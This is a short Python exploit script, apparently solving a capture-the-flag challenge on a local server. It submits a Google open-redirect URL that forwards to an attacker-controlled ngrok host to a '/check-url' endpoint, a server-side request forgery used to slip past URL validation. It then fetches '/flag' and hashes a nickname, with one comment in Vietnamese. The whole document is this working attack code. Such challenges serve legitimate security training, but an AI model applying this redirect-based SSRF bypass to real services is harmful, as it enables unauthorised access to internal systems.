import requests
import hashlib

BASE = "http://127.0.0.1"
nickname = "123"  

ssrf_url = f"https://www.google.com/url?sa=t&url=https://b205d224fdb6.ngrok-free.app&usg=AOvVaw1mtQ2EYbX0GN51xa17wkrJ"
resp1 = requests.post(
    f"{BASE}/check-url",
    json={"url": ssrf_url},
    headers={"Content-Type": "application/json"}
)

print("[+] SSRF response:", resp1.text)

resp2 = requests.post(f"{BASE}/flag?nickname={nickname}")
print("[+] Flag response:", resp2.text)

expected_flag = hashlib.sha256(nickname.encode()).hexdigest()
print(f"[i] Server sẽ hash nickname='{nickname}' -> {expected_flag}")
